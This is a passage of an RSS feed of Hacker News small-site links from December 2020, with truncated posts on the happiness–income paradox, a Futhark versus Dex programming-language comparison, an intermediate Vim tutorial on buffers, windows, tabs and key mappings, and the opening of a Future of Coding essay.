href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/9d23a6a3-1d80-462f-b088-4c410b383800_1800x1398.png&quot;,&quot;height&quot;:1131,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>The life satisfaction seems to be uniquely uncorrelated with the annual growth rate of GDP per capita. Could it be that the growth that we're seeing in GDP comes primarily from growth in population? That would mean that that while GDP is growing, it's doing so because there are just more people. They can't all be equally happy at something they made come about by the difficult feat of being born.</p><p>To quote from <a href="https://www.pnas.org/content/107/52/22463">his paper</a>:</p><blockquote><p>Simply stated, the happiness–income paradox is this: at a point in time both among and within nations, happiness varies directly with income, but over time, happiness does not increase when a country's income increases. We are talking here about the time series relationship of happiness and income in the long term, usually at least 10 years, sometimes more. As we shall see, the short-term relationship is a different story.</p></blockquote><p>This though only seemed to hold across countries as in the charts above. And it's not a linear relationship by any means, more of a trend seen from above. Just growing doesn't seem to be enough to get people happy.</p><p>The problem with the charts above is that they're point-in-time snapshots, and even the ones that seem to draw trends from one time to another seem to pick few datapoints rather than do even a cursory p-hack.</p><p>And the argument that Easterlin et al advance is that in the long run, a higher rate of economic growth by itself does not result in a greater increase in happiness.</p><p>The plot thickens.</p><h2>III</h2><p>The answer it seems, as is so often the case, comes from unpacking the "average" that's measured into it's component distribution.</p><p>Take the US for instance. The answer is not that people have gotten unhappier in the US in aggregate, or even in average. It's that while there has been modest growth in incomes over this period, it's barely kept pace, which means that the happiness index has been (at best) flat. While this isn't true if you do that graph solely for the top 1% in the income percentile, they don't seem to matter enough to sway this particular graph. While they do matter enough to sway the average income and GDP per capita graphs.</p><blockquote><p><a href="https://www.pnas.org/content/107/52/22463">This article</a> also contributes unique systematic evidence for developing and transition countries that short-term contractions and expansions are accompanied by corresponding movements in subjective well-being. Thus, in the short term, happiness and SWB are positively related, but over the long term—here, usually a minimum period of 10 y—the relationship is nil. The happiness–income paradox now holds for countries ranging from poor to rich: among countries, at a point in time happiness and income are positively related, but over time within a country, happiness does not increase as income goes up.</p><p>Consider, for example, three countries included here with very high recent growth rates of GDP—China, South Korea, and Chile. China's growth rate implies a doubling of real per capita income in less than 10 y; South Korea's, in 13 y; and Chile's, in 18 y. With the real per capita amount of goods multiplying so rapidly in a fraction of a lifetime, one might think many of the people in these countries would be so happy, they'd be dancing in the streets. Yet both China and Chile show mild (not statistically significant) declines in life satisfaction</p></blockquote><p>What this seems to indicate is that the impact of change in economic circumstances takes time to get ossified into the societal structures which (not too rapidly) increases satisfaction. So what does make people happy, or at least satisfied with their life? It's like a combination of a current reality metric and a future expectation metric. You need to feel like life's pretty good right now and also that it will continue to get better.</p><p>Easterlin also spoke about something quite similar. That our expectations from life grows as time goes on and incomes increase, so …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy">https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy</a></em></p>]]>
            </description>
            <link>https://www.strangeloopcanon.com/p/why-is-everyone-so-damn-happy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560021</guid>
            <pubDate>Mon, 28 Dec 2020 15:42:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparison of Futhark and Dex]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25559967">thread link</a>) | @Athas
<br/>
December 28, 2020 | https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on December 28, 2020
    
        by Troels Henriksen
    
</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</a></em></p>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559967</guid>
            <pubDate>Mon, 28 Dec 2020 15:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[21Lessons: What I've Learned from Falling Down the Bitcoin Rabbit Hole]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559946">thread link</a>) | @noch
<br/>
December 28, 2020 | https://21lessons.com/toc | <a href="https://web.archive.org/web/*/https://21lessons.com/toc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> <small> Except where otherwise noted, content on this site is licensed under a <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) license</a>. If you like the content on this site, there are many ways to <a href="https://dergigi.com/support">show your support</a>. </small></p><ul><li><a rel="me" href="https://twitter.com/dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://bitcoinhackers.org/@dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://www.instagram.com/dergigi/" target="_blank"><i></i></a></li><li><a rel="me" href="https://github.com/dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://medium.com/@dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://dergigi.com/support" target="_blank"><i></i></a></li><li><a rel="me" href="https://www.patreon.com/dergigi" target="_blank"><i></i></a></li></ul><p> <small> Sister projects: <a href="https://bit.ly/21waysbook">21 Ways</a> · <a href="https://bitcoin-resources.com/">Bitcoin Resources</a> · <a href="https://www.bitcoin-quotes.com/">Bitcoin Quotes</a> </small></p><p> <small> Made with 🧡 by <a href="https://dergigi.com/">Gigi</a> </small></p></div></div></div></div>]]>
            </description>
            <link>https://21lessons.com/toc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559946</guid>
            <pubDate>Mon, 28 Dec 2020 15:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Vim Guide for Intermediate Users]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559878">thread link</a>) | @thunderbong
<br/>
December 28, 2020 | https://thevaluable.dev/vim-intermediate/ | <a href="https://web.archive.org/web/*/https://thevaluable.dev/vim-intermediate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
        

        <section>
            
                <picture>
                    
                        <source srcset="https://thevaluable.dev/images/2020/vim_intermediate/vim_coffee.webp" type="image/webp">
                    
                    <img src="https://thevaluable.dev/images/2020/vim_intermediate/vim_coffee.jpg" alt="Intermediate Vim concepts">
                </picture>
            

            <p>Welcome to the second part of this series aimed to make you a better Vim user! If you have no idea about Vim, you should begin with <a href="https://thevaluable.dev/vim-for-beginners/" target="_blank" rel="noopener">the first part</a>. In this article, I’ll explain many more concepts, some of them making Vim truly special compared to other editors. Who wasn’t blown away discovering Vim’s macros?</p>
<p>Specifically, we’ll see together:</p>
<ul>
<li>Ways you can organize open files in Vim using buffers, windows, tabs, and the argument list.</li>
<li>Useful motions to jump quickly from one place to another in your entire codebase.</li>
<li>Mapping new keystrokes to old keystrokes or commands.</li>
<li>Powerful functionalities to repeat some of your keystrokes.</li>
<li>Ways of manipulating the command line history.</li>
<li>Plugins which offers different ways to manage some ideas we saw before.</li>
</ul>
<p>The amount of information in this article can feel overwhelming. My advice: take your time and don’t try to swallow everything at once. Experiment with Vim as you read along, try to understand how it works, and you’ll have a powerful tool you can control entirely with your keyboard.</p>


  






    









<p>You’ll see at the end of each sections some related Vim’s help commands. You can read these help sections directly in Vim when you’re ready to dive deeper.</p>
<h2 id="vims-spatial-organization">Vim’s Spatial Organization</h2>
<p>If you’re using an IDE, you’re certainly used to manage your files with tabs. Vim use other ways to represent and organize open files. Indeed, there are four <a href="https://thevaluable.dev/abstraction-type-software-example/">layers of abstraction</a> you can use for that: the <em>buffers</em>, the <em>windows</em>, the <em>tabs</em>, and the <em>argument list</em>.</p>
<h3 id="buffers">Buffers</h3>
<p>A <em>buffer</em> directly match an open file in memory. To make a comparison with a standard IDE, a buffer would be the <em>content</em> of a tab. The big difference: when you close a tab in an IDE, you close the file as well. Not in Vim; if you close a window containing a buffer, the buffer is still there, <em>hidden</em>.</p>
<p>In fact, a buffer can have three different states:</p>
<ul>
<li><em>active</em> - The buffer is displayed in a window.</li>
<li><em>hidden</em> - The buffer is not displayed, but it exists and the file is still open.</li>
<li><em>inactive</em> - The buffer is not displayed and <em>empty</em>. It’s not linked to any file.</li>
</ul>
<p>The content of a file in a hidden buffer is not directly visible in Vim. At that point, you might wonder: how do we know that this buffer is still open, if we can’t see it?</p>
<p>To see all opened buffered, we can look at the <em>buffer list</em>. You can use the command <code>:buffers</code> to display it. Each line contains:</p>
<ol>
<li>The buffer unique ID.</li>
<li>Indicators displaying different informations (for example <code>a</code> for active, <code>h</code> for hidden, or <code> </code> (space) for inactive).</li>
<li>The name of the buffer, if any. It can be the filepath of the file linked to the buffer.</li>
<li>The line number where the cursor is.</li>
</ol>
<p>For example: <code>27  %a   "layouts/shortcodes/notice.html" line 18</code> means that the buffer ID 27 is in state <code>a</code> (active), its name is <code>layouts/shortcodes/notice.html</code> and the cursor in this specific buffer is on line 18. You can as well know what’s the current buffer displayed with the flag <code>%</code> just before its state.</p>
<p>To navigate through the buffer list, you can use these commands:</p>
<ul>
<li><code>:buffer &lt;ID_or_name&gt;</code>- Move to the buffer using its ID or its name.</li>
<li><code>:bnext</code> or <code>:bn</code> - Move to the next buffer.</li>
<li><code>:bprevious</code> or <code>:bp</code> - Move to the previous buffer.</li>
<li><code>:bfirst</code> or <code>:bf</code> - move to the first buffer.</li>
<li><code>:blast</code> or <code>:bl</code> - move to the last buffer.</li>
<li><code>CTRL-^</code> - switch to the alternative buffer. It’s indicated in your buffer list with the symbol <code>#</code>.</li>
<li><code>&lt;ID&gt;CTRL-^</code> - Switch to a specific buffer with ID <code>&lt;ID&gt;</code>. For example, <code>75CTRL-^</code> switch to the buffer with ID 75.</li>
</ul>
<p>You can as well apply a command to all buffers using <code>:bufdo &lt;command&gt;</code>.</p>
<p>Not all buffers are displayed in the buffer list. To display unlisted buffers, you can use the command <code>:buffers!</code> or <code>ls!</code>. You’ll see unlisted buffer with an indicator <code>u</code> just after its ID.</p>
<p>Now, let’s ask this existential question: how can we create buffers?</p>
<ul>
<li>If you create a window, a buffer will be created automatically (see below).</li>
<li><code>:badd &lt;filename&gt;</code> - Add <code>&lt;filename&gt;</code> to the buffer list.</li>
</ul>
<p>If we can create buffers, we should be able to delete them:</p>
<ul>
<li><code>:bdelete &lt;ID_or_name&gt;</code> - Delete a buffer by ID or name. You can specify more than one ID or name separated with spaces to delete multiple buffers.</li>
<li><code>:1,10bdelete</code> - Delete buffers from ID 1 to 10 included.</li>
<li><code>:%bdelete</code> - Delete all buffers.</li>
</ul>
<p>If you modify a file, forget to save it, and close the window making the buffer hidden, you won’t be able to quit Vim. It will complain that you’re hidden buffer is not saved; to get around that, I would recommend to set the option hidden in your vimrc (by default <code>~/.vimrc</code>), as follow:</p>
<pre><code>set hidden
</code></pre><p>You can try it directly in your current session by running the command <code>:set hidden!</code> to toggle the option on and off. You can play around with it and see what suits best for you.</p>
<p>To see the value of any option, you can use a question mark. For example: <code>:set hidden?</code> or <code>:set filetype?</code>.</p>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help buffers</code></li>
<li><code>:help :buffers</code></li>
</ul>
 
    </div>
</div>



<h3 id="windows">Windows</h3>
<p>A window in Vim is nothing more than a space you can use to display the content of a buffer. Don’t forget: when you close the window, the buffer stays open.</p>
<p>When you open Vim, one window with one empty buffer are automatically created.</p>
<p>To create windows, you can use the <code>:new</code> command, or one of these keystrokes:</p>
<ul>
<li><code>CTRL-W s</code> - Split the current window horizontally.</li>
<li><code>CTRL-W v</code> - Split the current window vertically.</li>
<li><code>CTRL-W n</code> - Split the current windows horizontally and edit a new file.</li>
<li><code>CTRL-W ^</code> - Split the current with the <em>alternate file</em> (buffer with the <code>#</code> indicator in your buffer list).</li>
<li><code>&lt;buffer_ID&gt;CTRL-W ^</code> - Split windows with the buffer of ID <code>&lt;ID&gt;</code>. For example, <code>75 CTRL-W ^</code> will open a window with the buffer of ID 75.</li>
</ul>
<p>To move your cursor from one window to another, you can use:</p>
<ul>
<li><code>CTRL-W &lt;Down&gt;</code> or <code>CTRL-W j</code></li>
<li><code>CTRL-W &lt;Up&gt;</code> or <code>CTRL-W k</code></li>
<li><code>CTRL-W &lt;Left&gt;</code> or <code>CTRL-W h</code></li>
<li><code>CTRL-W &lt;right&gt;</code> or <code>CTRL-W l</code></li>
</ul>
<p>You always dreamt to move the windows? Me too. Here’s how to do it:</p>
<ul>
<li><code>CTRL-W r</code> - Rotate the windows.</li>
<li><code>CTRL-W x</code> - Exchange with the next window</li>
</ul>
<p>Who wants windows without being able to resize them? Here are the keystrokes you need:</p>
<ul>
<li><code>CTRL-W =</code> - Resize windows for them to fit on the screen with the same size.</li>
<li><code>CTRL-W -</code> - Decrease window’s height.</li>
<li><code>CTRL-W +</code> - Increase window’s height.</li>
<li><code>CTRL-W &lt;</code> - Decrease window’s width.</li>
<li><code>CTRL-W &gt;</code> - Increase window’s width.</li>
</ul>
<p>Using these keystrokes to move the cursor from window to window and to move the windows themselves is pretty tedious . We’ll see later a plugin which can help to make the whole operation smoother.</p>
<p>If you want to quit windows, you can use the commands:</p>
<ul>
<li><code>:q</code> - To <code>q</code>uit the current window. People lied to you! <code>:q</code> doesn’t quit Vim, but a window. You quit Vim only if there is only one window open.</li>
<li><code>:q!</code> - To <code>q</code>uit the current window, even if there is only one window open with an unsaved buffer<code>!</code>.</li>
</ul>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help windows</code></li>
<li><code>:help opening-window</code></li>
<li><code>:help window-move-cursor</code></li>
<li><code>:help window-moving</code></li>
<li><code>:help window-resize</code></li>
</ul>
 
    </div>
</div>



<h3 id="tabs">Tabs</h3>
<p>We saw that a buffer is an open file, and a window is the container for an active buffer. We can see tabs as a container for a bunch of windows. In that way, it’s very different than the concept of tabs in a standard IDE!</p>
<p>Here are the commands to create and delete tabs:</p>
<ul>
<li><code>:tabnew</code> or <code>:tabe</code> - Open a new tab.</li>
<li><code>:tabclose</code> or <code>:tabc</code> - Close the current tab.</li>
<li><code>:tabonly</code> or <code>:tabo</code> - Close every other tab except the current one.</li>
</ul>
<p>To move from tab to tab, you can use these keystrokes:</p>
<ul>
<li><code>gt</code> - <code>g</code>o to the next <code>t</code>ab.</li>
<li><code>gT</code> - <code>g</code>o to the previous tab.</li>
</ul>
<p>You can as well add a count before the last two keystrokes. For example, <code>1gT</code> go to the first tab. Yep, tabs are indexed from 1.</p>


  




    





  





<h3 id="argument-list-arglist">Argument List (arglist)</h3>
<p>The argument list (also called arglist) is the fourth and last container allowing you to organize your open files. It’s useful to see it as a <em>stable subset</em> of the buffer list, as Drew Neil point it out in <a href="http://vimcasts.org/episodes/meet-the-arglist/" target="_blank" rel="noopener">one of his vimcast</a>. As a result, it follows these two rules:</p>
<ol>
<li>Every file in the arglist will be in the buffer list.</li>
<li>Some files in the buffer list won’t be in the arglist.</li>
</ol>
<p>The files you want to open when you run Vim - such as executing <code>vim file1 file2 file3</code> - will be automatically added to the arglist and, as we just saw, to the buffer list.</p>
<p>The arglist can be useful to isolate some files from the buffer list to do some operations on them. Here are some commands you can use to manipulate the arglist:</p>
<ul>
<li><code>:args</code> - Display the arglist.</li>
<li><code>:argadd</code> - Add file to the arglist.</li>
<li><code>:argdo</code> - Execute a command on every file in the arglist.</li>
</ul>
<p>To edit the files in the arglist, you can use these commands:</p>
<ul>
<li><code>:next</code> - Move to the next file in the arglist.</li>
<li><code>:prev</code> - Move to the previous file in the arglist.</li>
<li><code>:first</code> - Move to the first file in the arglist.</li>
</ul>
<p>I don’t use very often the arglist personally, but many users do. The buffer list can be modified by other actions unrelated directly to buffers, like opening new windows. The arglist stays the same, except if you explicitly modify it. That’s why it’s stable.</p>


  




    





  





<h2 id="mapping-keystrokes">Mapping Keystrokes</h2>
<p>We’ve seen a great deal of keystrokes and commands. It would be nice to be able to modify these keystrokes, or to assign new keystrokes to precise commands.</p>
<p>You can use mapping commands for every Vim mode:</p>
<ul>
<li><code>:nmap</code> - Create new mapping for NORMAL mode.</li>
<li><code>:imap</code> - Create new mapping for INSERT mode.</li>
<li><code>:vmap</code> - Create new mapping for VISUAL mode.</li>
</ul>
<p>It might sound confusing to have different mappings for different modes, but it’s actually very easy to remember, thanks to our muscle memory.</p>
<p>Let’s try an example together by mapping <code>w</code> to <code>dd</code>. By default, <code>dd</code> delete a line, and <code>w</code> is a motion to move your cursor from word to word.</p>
<ol>
<li>Run the command <code>:nmap w dd</code></li>
<li>Try to hit the keystroke <code>dd</code>. It will delete a line.</li>
<li>Try to hit <code>w</code>. It deletes a line to.</li>
</ol>
<p>However, <code>w</code> can’t be used anymore to move from word to word. Let’s try to fix that by running: <code>:nmap w v</code>.</p>
<p>Try to hit <code>v</code> now. It deletes a line too! You just did a recursive mapping: <code>v</code> maps to <code>w</code> which maps to <code>dd</code>. It would be …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thevaluable.dev/vim-intermediate/">https://thevaluable.dev/vim-intermediate/</a></em></p>]]>
            </description>
            <link>https://thevaluable.dev/vim-intermediate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559878</guid>
            <pubDate>Mon, 28 Dec 2020 15:25:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The misunderstood roots of FRP can save programming (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559805">thread link</a>) | @Kinrany
<br/>
December 28, 2020 | https://futureofcoding.org/essays/dctp.html | <a href="https://web.archive.org/web/*/https://futureofcoding.org/essays/dctp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <nav>
        <a href="https://futureofcoding.org/">Future of Coding</a>
        <a href="https://futureofcoding.org/community">Community</a>
        <a href="https://futureofcoding.org/episodes">Podcast</a>
        <a href="https://futureofcoding.org/catalog">Whole Code Catalog</a>
      </nav>
      

<p><em>This essay was presented at Salon de Refuge 2019, colocated with &lt;Programming&gt; 2019, in Genoa, Italy on April 2nd, under the title <strong>Visual Denotative Programming</strong>. The talk was not recorded but you can <a href="https://www.loom.com/share/936dd606f9d948e194cf39bc353b2816">watch a (rough) practice talk here</a>. The <a href="https://github.com/stevekrouse/futureofcoding.org/files/3085610/Visual.Denotative.Programming.pdf">slides can be found here</a>.</em></p>

